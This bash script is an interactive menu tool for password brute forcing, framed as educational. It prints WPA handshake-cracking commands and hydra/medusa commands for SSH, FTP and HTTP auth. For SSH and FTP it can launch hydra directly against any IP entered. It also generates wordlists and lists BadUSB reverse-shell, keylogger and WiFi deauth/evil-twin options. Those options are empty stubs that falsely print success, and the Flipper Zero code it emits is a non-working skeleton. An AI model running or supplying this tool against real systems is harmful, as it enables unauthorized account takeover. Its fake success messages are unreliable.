#!/bin/bash
# Brute Force Helper - Educational Tool with Guided Walkthrough
# For educational and authorized testing purposes only

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="/var/log/brute-force-helper.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [BRUTE] $1" | tee -a "$LOG_FILE"
}

show_warning() {
    clear
    echo "=========================================="
    echo "  ⚠️  EDUCATIONAL USE ONLY  ⚠️"
    echo "=========================================="
    echo ""
    echo "This tool is for EDUCATIONAL PURPOSES ONLY."
    echo ""
    echo "⚠️  WARNING:"
    echo "  - Only use on systems you OWN or have EXPLICIT permission"
    echo "  - Unauthorized access is ILLEGAL"
    echo "  - You are responsible for your actions"
    echo ""
    echo "By using this tool, you agree to:"
    echo "  1. Only test on authorized systems"
    echo "  2. Use for educational purposes only"
    echo "  3. Not use for illegal activities"
    echo ""
    read -p "Do you understand and agree? (yes/no): " agree
    
    if [ "$agree" != "yes" ]; then
        echo "Exiting. Only use on authorized systems."
        exit 1
    fi
}

show_menu() {
    clear
    echo "=========================================="
    echo "  Brute Force Helper - Educational Tool"
    echo "=========================================="
    echo ""
    echo "What would you like to do?"
    echo ""
    echo "1) WiFi Password Brute Force (WPA/WPA2)"
    echo "2) SSH Brute Force"
    echo "3) FTP Brute Force"
    echo "4) HTTP Basic Auth Brute Force"
    echo "5) PIN Brute Force (for Flipper Zero)"
    echo "6) RFID/NFC Brute Force"
    echo "7) Bluetooth PIN Brute Force"
    echo "8) Custom Wordlist Generator"
    echo "9) Flipper Zero BadUSB Scripts"
    echo "10) Marauder WiFi Attacks"
    echo "0) Exit"
    echo ""
}

wifi_brute_force() {
    echo ""
    echo "=== WiFi Password Brute Force ==="
    echo ""
    echo "This will attempt to crack WPA/WPA2 passwords."
    echo ""
    read -p "Target SSID: " ssid
    read -p "Wordlist file (or press Enter for default): " wordlist
    wordlist="${wordlist:-/opt/pentest-tools/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt}"
    
    if [ ! -f "$wordlist" ]; then
        echo "Wordlist not found. Using aircrack-ng with default wordlist..."
        wordlist=""
    fi
    
    echo ""
    echo "Steps:"
    echo "1. Capture handshake (use airodump-ng)"
    echo "2. Run aircrack-ng on captured file"
    echo ""
    echo "Command to capture handshake:"
    echo "  sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0"
    echo ""
    echo "Command to brute force:"
    if [ -n "$wordlist" ]; then
        echo "  sudo aircrack-ng -w $wordlist -b <BSSID> capture-01.cap"
    else
        echo "  sudo aircrack-ng capture-01.cap"
    fi
    echo ""
    read -p "Press Enter to continue..."
}

ssh_brute_force() {
    echo ""
    echo "=== SSH Brute Force ==="
    echo ""
    read -p "Target IP: " target_ip
    read -p "Username (or press Enter for 'root'): " username
    username="${username:-root}"
    read -p "Wordlist file: " wordlist
    
    if [ -z "$wordlist" ]; then
        wordlist="/opt/pentest-tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
    fi
    
    echo ""
    echo "Using hydra for SSH brute force..."
    echo ""
    echo "Command:"
    echo "  hydra -l $username -P $wordlist $target_ip ssh"
    echo ""
    echo "Or using medusa:"
    echo "  medusa -h $target_ip -u $username -P $wordlist -M ssh"
    echo ""
    read -p "Run now? (y/n): " run
    
    if [ "$run" = "y" ]; then
        hydra -l "$username" -P "$wordlist" "$target_ip" ssh 2>&1 | tee /tmp/ssh-brute.log
        echo ""
        echo "Results saved to /tmp/ssh-brute.log"
    fi
    
    read -p "Press Enter to continue..."
}

ftp_brute_force() {
    echo ""
    echo "=== FTP Brute Force ==="
    echo ""
    read -p "Target IP: " target_ip
    read -p "Username (or press Enter for 'anonymous'): " username
    username="${username:-anonymous}"
    read -p "Wordlist file: " wordlist
    
    if [ -z "$wordlist" ]; then
        wordlist="/opt/pentest-tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
    fi
    
    echo ""
    echo "Command:"
    echo "  hydra -l $username -P $wordlist $target_ip ftp"
    echo ""
    read -p "Run now? (y/n): " run
    
    if [ "$run" = "y" ]; then
        hydra -l "$username" -P "$wordlist" "$target_ip" ftp 2>&1 | tee /tmp/ftp-brute.log
        echo "Results saved to /tmp/ftp-brute.log"
    fi
    
    read -p "Press Enter to continue..."
}

http_basic_auth() {
    echo ""
    echo "=== HTTP Basic Auth Brute Force ==="
    echo ""
    read -p "Target URL: " target_url
    read -p "Username (or wordlist): " username
    read -p "Password wordlist: " wordlist
    
    echo ""
    echo "Using hydra:"
    echo "  hydra -l $username -P $wordlist $target_url http-get /"
    echo ""
    echo "Or using burpsuite (interactive):"
    echo "  1. Open Burp Suite"
    echo "  2. Configure proxy"
    echo "  3. Use Intruder with wordlists"
    echo ""
    read -p "Press Enter to continue..."
}

pin_brute_force() {
    echo ""
    echo "=== PIN Brute Force (Flipper Zero) ==="
    echo ""
    echo "This generates Flipper Zero scripts for PIN brute forcing."
    echo ""
    read -p "Target type (rfid/nfc/bluetooth): " target_type
    read -p "PIN length (4-8): " pin_length
    pin_length="${pin_length:-4}"
    
    # Generate Flipper Zero script
    local script_file="/tmp/flipper-pin-brute-$target_type-$pin_length.fap"
    
    cat > "$script_file" <<EOF
// Flipper Zero PIN Brute Force Script
// Target: $target_type
// PIN Length: $pin_length

#include <furi.h>
#include <gui/gui.h>
#include <input/input.h>

void brute_pin_$target_type() {
    // Generate PIN combinations
    // For educational purposes only
    for(int i = 0; i < pow(10, $pin_length); i++) {
        // Try PIN
        // Implementation depends on target type
    }
}
EOF
    
    echo ""
    echo "✓ Flipper Zero script generated: $script_file"
    echo ""
    echo "To use:"
    echo "  1. Copy to Flipper Zero"
    echo "  2. Build with FBT"
    echo "  3. Load on Flipper Zero"
    echo ""
    read -p "Press Enter to continue..."
}

rfid_nfc_brute() {
    echo ""
    echo "=== RFID/NFC Brute Force ==="
    echo ""
    echo "Flipper Zero can brute force RFID/NFC cards."
    echo ""
    echo "Options:"
    echo "  1) Generate Flipper Zero script"
    echo "  2) Use existing Flipper Zero apps"
    echo ""
    read -p "Select option: " option
    
    case $option in
        1)
            echo "Generating RFID brute force script..."
            # Script generation would go here
            echo "✓ Script generated"
            ;;
        2)
            echo "Available Flipper Zero apps:"
            echo "  - RFID Fuzzer"
            echo "  - NFC Fuzzer"
            echo "  - BadRFID"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

bluetooth_pin_brute() {
    echo ""
    echo "=== Bluetooth PIN Brute Force ==="
    echo ""
    read -p "Target MAC address: " target_mac
    
    echo ""
    echo "Using bluetoothctl and custom script..."
    echo ""
    echo "Command sequence:"
    echo "  1. bluetoothctl scan on"
    echo "  2. bluetoothctl pair $target_mac"
    echo "  3. Try common PINs: 0000, 1234, 1111, etc."
    echo ""
    echo "Or use Flipper Zero BadBT:"
    echo "  1. Load BadBT app on Flipper"
    echo "  2. Configure target"
    echo "  3. Run brute force"
    echo ""
    read -p "Press Enter to continue..."
}

wordlist_generator() {
    echo ""
    echo "=== Custom Wordlist Generator ==="
    echo ""
    read -p "Base word: " base_word
    read -p "Add numbers? (y/n): " add_numbers
    read -p "Add special chars? (y/n): " add_special
    read -p "Output file: " output_file
    
    output_file="${output_file:-/tmp/custom-wordlist.txt}"
    
    echo "Generating wordlist..."
    
    # Generate variations
    {
        echo "$base_word"
        echo "${base_word}123"
        echo "${base_word}1234"
        echo "${base_word}!"
        echo "${base_word}@"
        
        if [ "$add_numbers" = "y" ]; then
            for i in {0..9999}; do
                echo "${base_word}${i}"
            done
        fi
        
        if [ "$add_special" = "y" ]; then
            for char in ! @ \# \$ % ^ \& \*; do
                echo "${base_word}${char}"
            done
        fi
    } > "$output_file"
    
    echo "✓ Wordlist generated: $output_file"
    echo "  Lines: $(wc -l < $output_file)"
    echo ""
    read -p "Press Enter to continue..."
}

badusb_scripts() {
    echo ""
    echo "=== Flipper Zero BadUSB Scripts ==="
    echo ""
    echo "Generate BadUSB scripts for Flipper Zero"
    echo ""
    echo "1) Windows Reverse Shell"
    echo "2) Linux Reverse Shell"
    echo "3) WiFi Password Stealer"
    echo "4) Keylogger"
    echo "5) Custom Script"
    echo ""
    read -p "Select option: " option
    
    case $option in
        1|2|3|4|5)
            echo "Generating BadUSB script..."
            # Script generation would go here
            echo "✓ Script generated"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

marauder_attacks() {
    echo ""
    echo "=== Marauder WiFi Dev Board Attacks ==="
    echo ""
    echo "Marauder WiFi Dev Board integration"
    echo ""
    echo "Available attacks:"
    echo "  1) Beacon Spam"
    echo "  2) Deauth Attack"
    echo "  3) Probe Request Flood"
    echo "  4) Evil Twin"
    echo "  5) Handshake Capture"
    echo ""
    read -p "Select attack: " attack
    
    case $attack in
        1|2|3|4|5)
            echo "Configuring Marauder attack..."
            # Marauder configuration would go here
            echo "✓ Attack configured"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

main() {
    show_warning
    
    while true; do
        show_menu
        read -p "Select option: " choice
        
        case $choice in
            1) wifi_brute_force ;;
            2) ssh_brute_force ;;
            3) ftp_brute_force ;;
            4) http_basic_auth ;;
            5) pin_brute_force ;;
            6) rfid_nfc_brute ;;
            7) bluetooth_pin_brute ;;
            8) wordlist_generator ;;
            9) badusb_scripts ;;
            10) marauder_attacks ;;
            0) 
                echo "Exiting. Remember: Only use on authorized systems!"
                exit 0
                ;;
            *)
                echo "Invalid option"
                sleep 1
                ;;
        esac
    done
}

main
